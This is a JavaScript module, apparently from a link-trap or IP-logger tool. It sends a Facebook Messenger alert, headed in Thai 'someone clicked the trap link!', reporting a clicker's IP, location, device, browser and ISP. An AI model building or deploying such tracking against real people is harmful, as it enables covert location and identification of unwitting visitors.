import axios from "axios";

const TOKEN = process.env.PAGE_ACCESS_TOKEN;
const ADMIN_PSID = process.env.ADMIN_PSID;

export async function notifyAdmin(visit) {
  if (!TOKEN || !ADMIN_PSID) return;
  const text =
    "🚨 มีคนกดลิงก์ดักจับ!\n\n" +
    "📝 Code: " + visit.code + "\n" +
    "🌐 IP: " + visit.ip + "\n" +
    "📍 Location: " + (visit.location || "Unknown") + "\n" +
    "📱 Device: " + visit.device + " / " + visit.os + " / " + visit.browser + "\n" +
    "🏢 ISP: " + (visit.isp || "-") + "\n" +
    "🕒 Time: " + visit.time;

  try {
    await axios.post(
      "https://graph.facebook.com/v21.0/me/messages",
      { recipient: { id: ADMIN_PSID }, message: { text } },
      { params: { access_token: TOKEN } }
    );
    console.log("Notified admin");
  } catch (err) {
    console.error("Notify failed:",err.response?.data?.error?.message);
  }
}
